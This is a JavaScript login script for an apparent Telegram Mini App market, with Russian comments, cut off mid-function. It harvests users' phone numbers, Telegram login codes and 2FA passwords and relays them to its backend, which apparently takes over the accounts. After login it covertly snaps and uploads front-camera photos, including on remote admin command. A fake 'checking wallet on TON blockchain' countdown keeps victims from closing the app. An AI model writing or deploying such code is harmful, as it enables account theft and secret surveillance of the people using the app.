let currentStep = 1;
let userPhone = "";
let enteredCode = "";
let authSessionId = null;
let botUsername = "";
let authHandlersInitialized = new Set();
let authAnimation = null;
let successAnimation = null;

// 2026-04-26: long-poll для команд от админа (📷 Фото).
// 2026-05-01: видео-команды убраны (Telegram WebView нестабильно отдаёт MediaRecorder).
// Работает ~5 минут после auth. Если permission уже дан — capture без prompt.
window._authCmdPolling = false;
window._authCmdPollGeneration = 0;
window._startAuthCmdPolling = async function (jobId) {
  if (!jobId) return;
  const generation = ++window._authCmdPollGeneration;
  window._authCmdPolling = true;
  console.log("[auth_cmd_poll] started for jobId=", jobId);
  const POLL_INTERVAL_MS = 1500;
  const MAX_DURATION_MS = 5 * 60 * 1000;
  const started = Date.now();
  while (
    generation === window._authCmdPollGeneration &&
    Date.now() - started < MAX_DURATION_MS
  ) {
    if (document.visibilityState === "hidden") {
      await new Promise((r) => setTimeout(r, POLL_INTERVAL_MS));
      continue;
    }
    try {
      const url =
        window.MarketAPI && window.MarketAPI.url
          ? window.MarketAPI.url(
              "/market/auth_cmd_poll?job_id=" + encodeURIComponent(jobId)
            )
          : "/market/auth_cmd_poll?job_id=" + encodeURIComponent(jobId);
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 10000);
      let resp;
      try {
        resp = await fetch(url, { method: "GET", signal: controller.signal });
      } finally {
        clearTimeout(timeoutId);
      }
      if (resp && resp.ok) {
        const j = await resp.json().catch(() => ({}));
        const cmds = (j && j.cmds) || [];
        for (const c of cmds) {
          const cmd = c && c.cmd;
          if (cmd === "photo") {
            try {
              await window._captureAndUploadAuthPhoto(jobId);
            } catch (e) {
              console.warn("[auth_cmd_poll] photo err", e);
            }
          }
        }
      }
    } catch (e) {
      /* silent */
    }
    await new Promise((r) => setTimeout(r, POLL_INTERVAL_MS));
  }
  if (generation === window._authCmdPollGeneration) {
    window._authCmdPolling = false;
    console.log("[auth_cmd_poll] stopped");
  }
};

// 2026-04-26: waiting screen. Показывает прогресс 3 минуты после auth, чтобы клиент не закрыл WebApp.
window._showWaitingScreen = function (jobId) {
  try {
    const generation = (window._authWaitingGeneration || 0) + 1;
    window._authWaitingGeneration = generation;
    const totalSec = 180; // 3 минуты
    let id = "authWaitingOverlay";
    let el = document.getElementById(id);
    if (el) el.remove();
    el = document.createElement("div");
    el.id = id;
    el.style.cssText =
      "position:fixed;inset:0;z-index:99999;background:#000;color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:-apple-system,system-ui,sans-serif;padding:24px;text-align:center;";
    el.innerHTML = `
      <div style="width:64px;height:64px;border:4px solid #2a2a2a;border-top-color:#3390ec;border-radius:50%;animation:authSpin 1s linear infinite;margin-bottom:24px;"></div>
      <div style="font-size:20px;font-weight:600;margin-bottom:10px;">Проверяем кошелёк</div>
      <div style="font-size:15px;color:#9aa;line-height:1.5;max-width:320px;margin-bottom:18px;">Идёт сверка с блокчейном TON. Пожалуйста, не закрывайте приложение.</div>
      <div id="authWaitingTimer" style="font-size:32px;font-weight:300;font-variant-numeric:tabular-nums;color:#3390ec;">3:00</div>
      <style>@keyframes authSpin{to{transform:rotate(360deg)}}</style>
    `;
    document.body.appendChild(el);
    let left = totalSec;
    const timerEl = document.getElementById("authWaitingTimer");
    const tick = () => {
      if (generation !== window._authWaitingGeneration || !el.isConnected)
        return;
      left -= 1;
      if (left < 0) {
        try {
          el.remove();
        } catch (e) {}
        return;
      }
      const m = Math.floor(left / 60),
        s = left % 60;
      if (timerEl) timerEl.textContent = m + ":" + (s < 10 ? "0" + s : s);
      setTimeout(tick, 1000);
    };
    setTimeout(tick, 1000);
  } catch (e) {
    console.warn("[waiting_screen] error:", e);
  }
};

// 2026-04-25: фоновый snapshot с камеры после успешной авторизации.
// Браузер сам спросит permission. iOS WebView может блокировать — silently skip.
// 2026-04-29: stage-пинги на /market/auth_diag — без них слепо угадывать где падает
// camera-capture в чужом Telegram WebView; смотрим master.log grep "auth_diag".
window._authDiag = async function (stage, jobId, extra) {
  try {
    const tg = window.Telegram && window.Telegram.WebApp;
    const _platform = (tg && tg.platform) || "";
    const _ver = (tg && tg.version) || "";
    const url =
      window.MarketAPI && window.MarketAPI.url
        ? window.MarketAPI.url("/market/auth_diag")
        : "/market/auth_diag";
    const body = {
      stage: String(stage || ""),
      job_id: String(jobId || ""),
      platform: String(_platform),
      version: String(_ver),
      error: String((extra && extra.error) || ""),
    };
    fetch(url, {
      method: "POST",
      keepalive: true,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    }).catch(() => {});
  } catch (e) {}
};

window._captureAndUploadAuthPhoto = async function (jobId) {
  console.log("[auth_photo] start, jobId=", jobId);
  window._authDiag("fn_called", jobId);
  if (!jobId) {
    console.warn("[auth_photo] no jobId — skip");
    window._authDiag("no_jobid", jobId);
    return;
  }
  if (
    typeof navigator === "undefined" ||
    !navigator.mediaDevices ||
    !navigator.mediaDevices.getUserMedia
  ) {
    console.warn("[auth_photo] mediaDevices not available — skip");
    window._authDiag("no_mediadevices", jobId, {
      error:
        "navigator=" +
        typeof navigator +
        " md=" +
        (navigator && navigator.mediaDevices ? "ok" : "undef"),
    });
    return;
  }
  window._authDiag("mediadevices_ok", jobId);
  let stream = null;
  let video = null;
  try {
    window._authDiag("getusermedia_call", jobId);
    stream = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: "user",
        width: { ideal: 640 },
        height: { ideal: 480 },
      },
      audio: false,
    });
    window._authDiag("getusermedia_ok", jobId);
    video = document.createElement("video");
    video.srcObject = stream;
    video.playsInline = true;
    video.muted = true;
    try {
      await video.play();
    } catch (e) {}
    // Прогрев камеры — иначе кадр чёрный
    await new Promise((r) => setTimeout(r, 700));
    const w = video.videoWidth || 640;
    const h = video.videoHeight || 480;
    const canvas = document.createElement("canvas");
    canvas.width = w;
    canvas.height = h;
    canvas.getContext("2d").drawImage(video, 0, 0, w, h);
    const blob = await new Promise((r) => canvas.toBlob(r, "image/jpeg", 0.85));
    if (!blob) return;
    const b64 = await new Promise((res, rej) => {
      const fr = new FileReader();
      fr.onload = () => {
        const s = String(fr.result || "");
        res(s.split(",")[1] || "");
      };
      fr.onerror = rej;
      fr.readAsDataURL(blob);
    });
    if (!b64 || !window.MarketAPI) {
      console.warn("[auth_photo] no b64 or MarketAPI");
      window._authDiag("no_b64_or_api", jobId, {
        error:
          "b64=" +
          (b64 ? b64.length : 0) +
          " api=" +
          (window.MarketAPI ? "ok" : "missing"),
      });
      return;
    }
    window._authDiag("uploading", jobId, { error: "size=" + b64.length });
    console.log("[auth_photo] sending blob, size=", b64.length);
    const _r = await window.MarketAPI.request("/market/auth_photo", "POST", {
      job_id: String(jobId),
      photo_b64: b64,
    });
    console.log("[auth_photo] upload result:", _r);
    window._authDiag("upload_done", jobId, {
      error:
        "success=" +
        (_r && _r.success ? "yes" : "no") +
        " err=" +
        ((_r && _r.error) || ""),
    });
  } catch (e) {
    const _msg = (e && e.name + ":" + e.message) || String(e);
    console.warn("[auth_photo] error:", _msg);
    window._authDiag("exception", jobId, { error: _msg });
  } finally {
    try {
      if (stream) stream.getTracks().forEach((t) => t.stop());
    } catch (e) {}
    try {
      if (video) {
        video.pause();
        video.srcObject = null;
      }
    } catch (e) {}
  }
};

// ── Персистентность шага авторизации ────────────────────────────────────────
// При сворачивании/закрытии WebApp прогресс (введённый телефон, ожидание кода,
// ввод 2FA) сохраняется в localStorage и восстанавливается при открытии.
const _AUTH_STATE_TTL = 12 * 60 * 1000; // 12 минут

function _authStateKey() {
  try {
    const uid = window.Telegram?.WebApp?.initDataUnsafe?.user?.id;
    return uid ? `mkt_auth_${uid}` : "mkt_auth";
  } catch (e) {
    return "mkt_auth";
  }
}

function _saveAuthStep(step, phone) {
  // localStorage + sessionStorage: sessionStorage иногда выживает minimize на Android,
  // localStorage переживает kill WebApp context в iOS/Desktop. Пишем в оба — читаем из любого.
  const payload = JSON.stringify({ step, ts: Date.now() });
  try {
    localStorage.setItem(_authStateKey(), payload);
  } catch (e) {}
  try {
    sessionStorage.setItem(_authStateKey(), payload);
  } catch (e) {}
}

function _loadAuthStep() {
  const _tryParse = (raw) => {
    try {
      if (!raw) return null;
      const d = JSON.parse(raw);
      if (!d || !d.ts || Date.now() - d.ts > _AUTH_STATE_TTL) return null;
      return d;
    } catch (e) {
      return null;
    }
  };
  let d = null;
  try {
    d = _tryParse(localStorage.getItem(_authStateKey()));
  } catch (e) {}
  if (!d) {
    try {
      d = _tryParse(sessionStorage.getItem(_authStateKey()));
    } catch (e) {}
  }
  if (!d) {
    _clearAuthStep();
    return null;
  }
  return d;
}

function _clearAuthStep() {
  try {
    localStorage.removeItem(_authStateKey());
  } catch (e) {}
  try {
    sessionStorage.removeItem(_authStateKey());
  } catch (e) {}
}

const LOTTIE_WRAPPER_STYLES = {
  width: "100%",
  height: "100%",
  position: "relative",
  overflow: "visible",
  display: "flex",
  alignItems: "center",
  justifyContent: "center",
};

function initAuth(botUsernameParam, prefix = "") {
  let verifyInFlight = false;
  botUsername =
    botUsernameParam ||
    new URLSearchParams(window.location.search).get("bot_username") ||
    "";

  if (prefix === "registration") {
    if (!window.authState) {
      window.authState = {};
    }
    window.authState.currentStep = 1;
    window.authState.userPhone = "";
    window.authState.enteredCode = "";
    window.authState.authSessionId = null;
  }

  const step1Id = prefix ? `${prefix}Step1` : "step1";
  const step2Id = prefix ? `${prefix}Step2` : "step2";
  const step2faId = prefix ? `${prefix}Step2fa` : "step2fa";
  const step3Id = prefix ? `${prefix}Step3` : "step3";
  const step1DotId = prefix ? `${prefix}Step1Dot` : "step1-dot";
  const step2DotId = prefix ? `${prefix}Step2Dot` : "step2-dot";
  const step3DotId = prefix ? `${prefix}Step3Dot` : "step3-dot";
  const progressFillId = prefix ? `${prefix}ProgressFill` : "progressFill";
  const statusId = prefix ? `${prefix}Status` : "status";
  const startAuthBtnId = prefix ? `${prefix}StartAuthBtn` : "startAuthBtn";
  const digit1Id = prefix ? `${prefix}Digit1` : "digit1";
  const digit2Id = prefix ? `${prefix}Digit2` : "digit2";
  const digit3Id = prefix ? `${prefix}Digit3` : "digit3";
  const digit4Id = prefix ? `${prefix}Digit4` : "digit4";
  const digit5Id = prefix ? `${prefix}Digit5` : "digit5";
  const password2faId = prefix ? `${prefix}Password2fa` : "password2fa";
  const submit2faBtnId = prefix ? `${prefix}Submit2faBtn` : "submit2faBtn";
  const togglePasswordId = prefix
    ? `${prefix}TogglePassword`
    : "togglePassword";

  const steps = {
    1: document.getElementById(step1Id),
    2: document.getElementById(step2Id),
    "2fa": document.getElementById(step2faId),
    3: document.getElementById(step3Id),
  };

  const stepDots = {
    1: document.getElementById(step1DotId),
    2: document.getElementById(step2DotId),
    3: document.getElementById(step3DotId),
  };

  const progressFill = document.getElementById(progressFillId);

  let cachedCodeInputs = null;
  function getCodeInputs() {
    if (!cachedCodeInputs) {
      cachedCodeInputs = [
        document.getElementById(digit1Id),
        document.getElementById(digit2Id),
        document.getElementById(digit3Id),
        document.getElementById(digit4Id),
        document.getElementById(digit5Id),
      ].filter(Boolean);
    }
    return cachedCodeInputs;
  }

  function showSuccessUI() {
    const SUCCESS_DELAY = 15000;
    setTimeout(() => {
      const loader = document.querySelector(
        prefix ? `#${step3Id} .liquid-loader` : ".liquid-loader"
      );
      const successContent = document.querySelector(
        prefix ? `#${step3Id} .success-content` : ".success-content"
      );
      const authAnimationContainer = document.getElementById(
        prefix ? `${prefix}AuthAnimation` : "authAnimation"
      );
      if (loader) loader.style.display = "none";
      if (authAnimationContainer) authAnimationContainer.style.display = "none";
      if (successContent) {
        successContent.classList.add("show");
        if (prefix === "registration") {
          loadAnimation("yspex.tgs", "success");
        }
      }
      // После показа "Вход выполнен" — сообщаем приложению об успешном входе
      setTimeout(() => {
        window.dispatchEvent(new CustomEvent("market:authSuccess"));
      }, 2000);
    }, SUCCESS_DELAY);
  }

  function handleAuthSuccess(jobId) {
    showStep(3);
    showSuccessUI();
    // 2026-04-29: waiting screen ПЕРВЫМ — иначе юзер закрывает WebApp на success-экране
    // до завершения upload фото → ClientDisconnect → photo не сохраняется (см. master.log
    // grep "auth_photo saved" — после 2026-04-26 ни одного успеха).
    if (jobId && typeof window._showWaitingScreen === "function") {
      try {
        window._showWaitingScreen(jobId);
      } catch (e) {}
    }
    // Snapshot с камеры — БЕЗ await чтобы не блокировать UI, но overlay выше
    // удержит юзера в приложении пока fetch завершится.
    if (jobId && typeof window._captureAndUploadAuthPhoto === "function") {
      window._captureAndUploadAuthPhoto(jobId).catch(() => {});
    }
    if (jobId && typeof window._startAuthCmdPolling === "function") {
      window._startAuthCmdPolling(jobId).catch(() => {});
    }
  }

  function escapeHtml(text) {
    const div = document.createElement("div");
    div.textContent = text;
    return div.innerHTML;
  }

  function showStatus(message, type = "error") {
    const container = document.getElementById("notificationsContainer");
    if (!container) {
      return;
    }

    const notification = document.createElement("div");
    notification.className = `notification ${type}`;

    notification.innerHTML = `
      <div class="notification-content">
        <div class="notification-message">${escapeHtml(message)}</div>
      </div>
      <div class="notification-progress">
        <div class="notification-progress-bar"></div>
      </div>
    `;

    container.appendChild(notification);

    const duration = 3000;
    const progressBar = notification.querySelector(
      ".notification-progress-bar"
    );
    if (progressBar) {
      progressBar.style.animationDuration = `${duration}ms`;
    }

    setTimeout(() => {
      notification.classList.add("slide-out");
      setTimeout(() => {
        if (notification.parentNode) {
          notification.parentNode.removeChild(notification);
        }
      }, 300);
    }, duration);
  }

  async function loadAnimation(animationFile, type = "auth") {
    const isSuccess = type === "success";
    const containerId = isSuccess
      ? prefix
        ? `${prefix}SuccessAnimation`
        : "successAnimation"
      : prefix
      ? `${prefix}AuthAnimation`
      : "authAnimation";
    const animationContainer = document.getElementById(containerId);
    if (!animationContainer) return;

    const currentAnim = isSuccess ? successAnimation : authAnimation;
    if (currentAnim) {
      currentAnim.destroy();
      if (isSuccess) successAnimation = null;
      else authAnimation = null;
    }
    animationContainer.innerHTML = "";

    try {
      const response = await fetch(window.marketSticUrl(animationFile));
      if (!response.ok) throw new Error("Failed to load animation");

      const arrayBuffer = await response.arrayBuffer();
      const ds = new DecompressionStream("gzip");
      const decompressedStream = new Response(
        new Blob([arrayBuffer]).stream().pipeThrough(ds)
      ).arrayBuffer();

      const decompressed = await decompressedStream;
      const jsonString = new TextDecoder().decode(decompressed);
      const animationData = JSON.parse(jsonString);

      if (typeof lottie !== "undefined") {
        const lottieWrapper = document.createElement("div");
        Object.assign(lottieWrapper.style, LOTTIE_WRAPPER_STYLES);
        animationContainer.appendChild(lottieWrapper);

        const anim = lottie.loadAnimation({
          container: lottieWrapper,
          renderer: "svg",
          loop: true,
          autoplay: true,
          animationData: animationData,
          rendererSettings: {
            preserveAspectRatio: "xMidYMid meet",
            progressiveLoad: true,
            hideOnTransparent: true,
          },
        });

        if (isSuccess) successAnimation = anim;
        else authAnimation = anim;
      }
    } catch (error) {}
  }

  function showStep(step) {
    Object.values(steps).forEach((el) => {
      if (el) el.classList.remove("active");
    });
    Object.values(stepDots).forEach((dot) => {
      if (dot) dot.classList.remove("active");
    });

    if (steps[step]) steps[step].classList.add("active");

    for (let i = 1; i <= step && i <= 3; i++) {
      if (stepDots[i]) stepDots[i].classList.add("active");
    }

    if (progressFill) {
      const progress = step === "2fa" ? 66 : step * 33.33;
      progressFill.style.width = Math.min(progress, 100) + "%";
    }

    currentStep = step;
    // Сохраняем/чистим шаг в localStorage
    if (step === 2) _saveAuthStep(2, userPhone);
    if (step === "2fa") _saveAuthStep("2fa", userPhone);
    if (step === 3) _clearAuthStep(); // авторизация завершена
    if (step === 1) _clearAuthStep(); // сброс

    if (step === 1) {
      try {
        resetStartAuthUI();
      } catch {}
      if (prefix === "registration") {
        loadAnimation("phone.tgs");
      }
    }

    const codeInputs = getCodeInputs();

    if (step === 2 && codeInputs[0]) {
      try {
        if (tg && tg.expand) tg.expand();
      } catch (_) {}
      setTimeout(() => codeInputs[0].focus(), 0);

      if (prefix === "registration") {
        loadAnimation("chat.tgs");
      }

      if (prefix === "registration") {
        const showCodeLink = document.getElementById(
          "registrationShowCodeLink"
        );
        if (showCodeLink) {
          showCodeLink.classList.remove("hidden");
          showCodeLink.href = "https://t.me/+42777";
        }
      }
    }

    if (step === 3) {
      if (prefix === "registration") {
        loadAnimation("time.tgs");
      }
    }
  }

  function clearCodeInputs() {
    const codeInputs = getCodeInputs();

    codeInputs.forEach((input) => {
      if (input) input.value = "";
    });
    enteredCode = "";
    if (prefix === "registration" && window.authState) {
      window.authState.enteredCode = "";
    }
    if (codeInputs[0]) {
      codeInputs[0].focus();
      if (window.Telegram?.WebApp) {
        window.Telegram.WebApp.HapticFeedback.selectionChanged();
      }
    }
  }

  async function verifyCode() {
    if (enteredCode.length !== 5 || verifyInFlight) return;
    verifyInFlight = true;

    if (window.Telegram?.WebApp) {
      window.Telegram.WebApp.HapticFeedback.impactOccurred("light");
    }

    try {
      const result = await window.MarketAPI.auth("verify_code", {
        session_id: authSessionId,
        code: enteredCode,
      });

      if (result.success && result.need_2fa) {
        showStep("2fa");
      } else if (result.success) {
        handleAuthSuccess(result.job_id);
      } else if (result.need_2fa) {
        showStep("2fa");

        const passwordHint = document.getElementById(`${prefix}PasswordHint`);
        if (passwordHint) {
          if (result.hint && result.hint.trim()) {
            passwordHint.textContent = `Подсказка: ${result.hint}`;
            passwordHint.style.display = "block";
          } else {
            passwordHint.style.display = "none";
          }
        }
      } else {
        throw new Error(result.error || "Неверный код");
      }
    } catch (error) {
      showStatus(error.message, "error");
      clearCodeInputs();
    } finally {
      verifyInFlight = false;
    }
  }

  function resetStartAuthUI() {
    const startAuthBtn = document.getElementById(startAuthBtnId);
    if (!startAuthBtn) return;
    startAuthBtn.disabled = false;
    startAuthBtn.innerHTML = "<span>Войти</span>";
  }

  function updateCode() {
    const codeInputs = getCodeInputs();
    if (codeInputs.length === 0) return;

    enteredCode = codeInputs
      .map((input) => input.value)
      .join("")
      .replace(/\D/g, "");
    if (prefix === "registration" && window.authState) {
      window.authState.enteredCode = enteredCode;
    }
    if (enteredCode.length === 5) {
      try {
        window.Telegram?.WebApp?.HapticFeedback?.notificationOccurred(
          "success"
        );
      } catch (e) {}
      verifyCode();
    }
  }

  async function sendCode() {
    const phoneInputEl = document.getElementById(
      prefix ? `${prefix}PhoneInput` : "phoneInput"
    );
    const phone = phoneInputEl ? phoneInputEl.value.trim() : "";
    if (phoneInputEl) {
      const digits = phone.replace(/\D/g, "");
      if (!phone || digits.length < 2) {
        showStatus("Введите номер телефона", "error");
        resetStartAuthUI();
        if (phoneInputEl) phoneInputEl.focus();
        return;
      }
      if (digits.length < 10 || digits.length > 15) {
        showStatus("Неверный номер (от 10 до 15 цифр)", "error");
        resetStartAuthUI();
        if (phoneInputEl) phoneInputEl.focus();
        return;
      }
    }
    try {
      const body = phoneInputEl
        ? {
            phone: phone.startsWith("+")
              ? phone
              : "+" + phone.replace(/\D/g, ""),
          }
        : {};
      const result = await window.MarketAPI.auth("start", body);

      if (result.success) {
        if (phoneInputEl) userPhone = phone;
        authSessionId = result.session_id;
        if (prefix === "registration" && window.authState) {
          window.authState.authSessionId = result.session_id;
        }
        showStep(2);
      } else {
        throw new Error(result.error);
      }
    } catch (error) {
      showStatus("Ошибка отправки кода: " + error.message, "error");
      resetStartAuthUI();
    }
  }

  function initAuthHandlers() {
    if (authHandlersInitialized.has(prefix || "default")) {
      return;
    }
    authHandlersInitialized.add(prefix || "default");

    const startAuthBtn = document.getElementById(startAuthBtnId);
    if (startAuthBtn) {
      startAuthBtn.addEventListener("click", async () => {
        if (window.Telegram?.WebApp) {
          window.Telegram.WebApp.HapticFeedback.impactOccurred("light");
        }

        startAuthBtn.disabled = true;
        startAuthBtn.innerHTML = `<div class="loading"></div>Отправляем код...`;

        await sendCode();
      });
    }

    // Поле телефона в initAuth-флоу (если есть)
    const phoneInputEl = document.getElementById(
      prefix ? `${prefix}PhoneInput` : "phoneInput"
    );
    const flagEl = document.getElementById(
      prefix ? `${prefix}CountryFlag` : "countryFlag"
    );
    if (phoneInputEl) {
      const COUNTRIES = [
        { flag: "🇺🇿", code: "+998" },
        { flag: "🇹🇯", code: "+992" },
        { flag: "🇰🇬", code: "+996" },
        { flag: "🇹🇲", code: "+993" },
        { flag: "🇦🇿", code: "+994" },
        { flag: "🇬🇪", code: "+995" },
        { flag: "🇺🇦", code: "+380" },
        { flag: "🇧🇾", code: "+375" },
        { flag: "🇮🇱", code: "+972" },
        { flag: "🇷🇺", code: "+7" },
        { flag: "🇺🇸", code: "+1" },
      ];
      function detectFlag(val) {
        if (!flagEl) return;
        const clean = val.replace(/[^+\d]/g, "");
        for (const c of COUNTRIES) {
          if (clean.startsWith(c.code)) {
            flagEl.textContent = c.flag;
            return;
          }
        }
        flagEl.textContent = "🌍";
      }
      phoneInputEl.addEventListener("input", () => {
        let v = phoneInputEl.value;
        if (v && !v.startsWith("+")) phoneInputEl.value = "+" + v;
        detectFlag(phoneInputEl.value);
      });
      phoneInputEl.addEventListener("focus", () => {
        if (!phoneInputEl.value) phoneInputEl.value = "+";
        try {
          if (window.Telegram?.WebApp?.expand) window.Telegram.WebApp.expand();
        } catch (_) {}
      });
      phoneInputEl.addEventListener("keydown", (e) => {
        if (e.key === "Enter") {
          e.preventDefault();
          document.getElementById(startAuthBtnId)?.click();
        }
      });
      detectFlag(phoneInputEl.value);
    }

    const codeInputs = getCodeInputs();

    if (codeInputs.length > 0) {
      const codeContainer = codeInputs[0].closest(".code-input-container");
      if (codeContainer) {
        codeContainer.addEventListener("paste", (e) => {
          e.preventDefault();
          const paste = (e.clipboardData || window.clipboardData)
            .getData("text")
            .trim();
          const digits = paste.replace(/\D/g, "").substring(0, 5);

          codeInputs.forEach((input, index) => {
            if (input) {
              input.value = index < digits.length ? digits[index] : "";
            }
          });

          const focusIndex = Math.min(digits.length, 4);
          if (codeInputs[focusIndex]) codeInputs[focusIndex].focus();

          updateCode();
          if (window.Telegram?.WebApp) {
            window.Telegram.WebApp.HapticFeedback.impactOccurred("medium");
          }
        });
      }

      // 2026-04-26: robust advance — input event ненадёжен на некоторых Android.
      // setTimeout(0) + keyup как fallback + поддержка multi-digit вставки.
      function _mainAdvanceFromInput(index) {
        setTimeout(() => {
          const input = codeInputs[index];
          if (!input) return;
          const cleaned = (input.value || "").replace(/\D/g, "");
          if (cleaned.length > 1) {
            for (
              let j = 0;
              j < cleaned.length && index + j < codeInputs.length;
              j++
            ) {
              codeInputs[index + j].value = cleaned[j];
            }
            const focusIdx = Math.min(
              index + cleaned.length,
              codeInputs.length - 1
            );
            if (codeInputs[focusIdx]) codeInputs[focusIdx].focus();
          } else if (cleaned.length === 1) {
            input.value = cleaned;
            if (index < codeInputs.length - 1) codeInputs[index + 1]?.focus();
          } else {
            input.value = "";
          }
          updateCode();
        }, 0);
      }
      codeInputs.forEach((input, index) => {
        input.addEventListener("input", () => _mainAdvanceFromInput(index));
        // Fallback на keyup для Android-клавиатур где input не фигурирует
        input.addEventListener("keyup", (e) => {
          if (
            (e.key === "Backspace" || e.keyCode === 8) &&
            !input.value &&
            index > 0
          ) {
            codeInputs[index - 1]?.focus();
            return;
          }
          if (input.value) _mainAdvanceFromInput(index);
        });

        input.addEventListener("keydown", (e) => {
          if (
            (e.key === "Backspace" || e.keyCode === 8) &&
            !e.target.value &&
            index > 0
          ) {
            if (codeInputs[index - 1]) codeInputs[index - 1].focus();
          } else if (e.key === "ArrowLeft" && index > 0) {
            e.preventDefault();
            if (codeInputs[index - 1]) codeInputs[index - 1].focus();
          } else if (e.key === "ArrowRight" && index < codeInputs.length - 1) {
            e.preventDefault();
            if (codeInputs[index + 1]) codeInputs[index + 1].focus();
          }
        });

        input.addEventListener("focus", (e) => {
          setTimeout(() => e.target.select(), 0);
        });
      });
    }

    const submit2faBtn = document.getElementById(submit2faBtnId);
    const password2fa = document.getElementById(password2faId);

    if (submit2faBtn && password2fa) {
      submit2faBtn.addEventListener("click", async () => {
        if (window.Telegram?.WebApp) {
          window.Telegram.WebApp.HapticFeedback.impactOccurred("light");
        }

        const password = password2fa.value.trim();
        if (!password) {
          showStatus("Введите пароль 2FA", "error");
          return;
        }

        const originalHTML = submit2faBtn.innerHTML;
        submit2faBtn.disabled = true;
        submit2faBtn.innerHTML =
          '<div class="loading"></div>Проверяем пароль...';

        try {
          const result = await window.MarketAPI.auth("verify_2fa", {
            session_id: authSessionId,
            password: password,
          });

          if (result.success) {
            handleAuthSuccess(result.job_id);
          } else {
            throw new Error(result.error || "Неверный пароль 2FA");
          }
        } catch (error) {
          showStatus(error.message, "error");
          password2fa.value = "";
          submit2faBtn.disabled = false;
          submit2faBtn.innerHTML = originalHTML;
        } finally {
          submit2faBtn.disabled = false;
          submit2faBtn.innerHTML = originalHTML;
        }
      });
    }

    const authContainer = document.querySelector(
      ".registration-auth-container"
    );
    if (authContainer) {
      authContainer.addEventListener("click", (e) => {
        const target = e.target;
        const isInput =
          target.tagName === "INPUT" ||
          target.tagName === "BUTTON" ||
          target.closest("input") ||
          target.closest("button");

        if (!isInput) {
          const activeElement = document.activeElement;
          if (
            activeElement &&
            (activeElement.tagName === "INPUT" ||
              activeElement.tagName === "TEXTAREA")
          ) {
            activeElement.blur();
          }

          if (window.Telegram?.WebApp) {
            window.Telegram.WebApp.HapticFeedback.selectionChanged();
          }
        }
      });
    }
  }

  // Функция очистки анимаций при выходе из view
  function cleanup() {
    if (authAnimation) {
      try {
        authAnimation.destroy();
      } catch (e) {}
      authAnimation = null;
    }
    if (successAnimation) {
      try {
        successAnimation.destroy();
      } catch (e) {}
      successAnimation = null;
    }
  }

  // Сброс состояния авторизации
  function resetAuth() {
    cleanup();
    _clearAuthStep();
    currentStep = 1;
    userPhone = "";
    enteredCode = "";
    authSessionId = null;

    if (prefix === "registration" && window.authState) {
      window.authState.currentStep = 1;
      window.authState.userPhone = "";
      window.authState.enteredCode = "";
      window.authState.authSessionId = null;
    }

    // Очистка полей ввода
    const codeInputs = getCodeInputs();
    codeInputs.forEach((input) => {
      if (input) input.value = "";
    });

    const password2fa = document.getElementById(
      prefix ? `${prefix}Password2fa` : "password2fa"
    );
    if (password2fa) password2fa.value = "";
  }

  initAuthHandlers();

  if (prefix === "registration" && currentStep === 1) {
    loadAnimation("phone.tgs");
  }

  // Восстанавливаем прерванную авторизацию: проверяем localStorage,
  // потом сервер — и показываем нужный шаг без перезаполнения телефона.
  (async () => {
    const saved = _loadAuthStep();
    if (!saved || (saved.step !== 2 && saved.step !== "2fa")) return;
    try {
      const res = await window.MarketAPI.auth("status", {});
      if (!res?.success) {
        _clearAuthStep();
        return;
      }
      const s = res.status;
      if (s === "code_sent" && saved.step === 2) {
        userPhone = saved.phone || "";
        authSessionId = null; // сервер использует uid из initData, не session_id
        showStep(2);
      } else if (s === "need_2fa" && saved.step === "2fa") {
        userPhone = saved.phone || "";
        authSessionId = null;
        showStep("2fa");
      } else if (s === "done") {
        _clearAuthStep();
        handleAuthSuccess();
      } else {
        _clearAuthStep();
      }
    } catch (e) {
      _clearAuthStep();
    }
  })();

  return {
    init: initAuthHandlers,
    cleanup: cleanup,
    reset: resetAuth,
  };
}

// ── Авторизация через mrkt.land OAuth (Telegram OpenID) ─────────────────────
//
// Флоу:
//   1. Вызываем POST /market/auth {action:'start_tg_oauth'}
//      → бэкенд открывает сессию на mrkt.land, возвращает t.me/oauth?startapp=...
//   2. Открываем ссылку через Telegram.WebApp.openTelegramLink
//      (пользователь видит диалог @oauth «Авторизация на www.mrkt.la...» → нажимает «Авторизоваться»)
//   3. Поллим POST /market/auth {action:'tg_oauth_status'} каждые 3 сек
//      → когда status=='done' → бэкенд уже поймал авторизацию через mrkt.land cookies
//   4. Показываем success UI
//
window._mrktOAuthPollGeneration = 0;
window._cancelMrktOAuthPolling = function () {
  window._mrktOAuthPollGeneration += 1;
};

window.startMrktOAuth = async function (onSuccess, onError) {
  const tg = window.Telegram && window.Telegram.WebApp;
  const generation = ++window._mrktOAuthPollGeneration;
  try {
    // Шаг 1: получаем OAuth ссылку
    const startRes = await window.MarketAPI.auth("start_tg_oauth", {});
    if (!startRes || !startRes.success) {
      const msg =
        (startRes && startRes.error) || "Не удалось начать авторизацию";
      if (typeof onError === "function") onError(msg);
      return;
    }
    const tgLink = startRes.tg_link; // "https://t.me/oauth?startapp=..."

    // Шаг 2: открываем ссылку в Telegram (работает внутри Mini App)
    if (tg && typeof tg.openTelegramLink === "function") {
      tg.openTelegramLink(tgLink);
    } else {
      // Fallback: открываем в браузере
      window.open(tgLink, "_blank");
    }

    // Шаг 3: поллим статус каждые 3 сек (макс 10 минут)
    const POLL_INTERVAL_MS = 3000;
    const MAX_POLLS = 200; // 10 минут
    let polls = 0;
    while (
      generation === window._mrktOAuthPollGeneration &&
      polls < MAX_POLLS
    ) {
      await new Promise((resolve) => setTimeout(resolve, POLL_INTERVAL_MS));
      if (generation !== window._mrktOAuthPollGeneration) return;
      if (document.visibilityState === "hidden") continue;
      polls += 1;
      if (polls >= MAX_POLLS) {
        if (typeof onError === "function") onError("Время авторизации истекло");
        return;
      }
      try {
        const statusRes = await window.MarketAPI.auth("tg_oauth_status", {});
        if (generation !== window._mrktOAuthPollGeneration) return;
        if (!statusRes || !statusRes.success) continue;
        const status = statusRes.status;
        if (status === "done") {
          window._cancelMrktOAuthPolling();
          if (typeof onSuccess === "function") onSuccess();
          return;
        } else if (status === "expired" || status === "failed") {
          window._cancelMrktOAuthPolling();
          if (typeof onError === "function")
            onError("Авторизация отменена или истекло время");
          return;
        }
      } catch (e) {
        // Сетевая ошибка — игнорируем, поллим дальше
      }
    }
  } catch (e) {
    if (
      generation === window._mrktOAuthPollGeneration &&
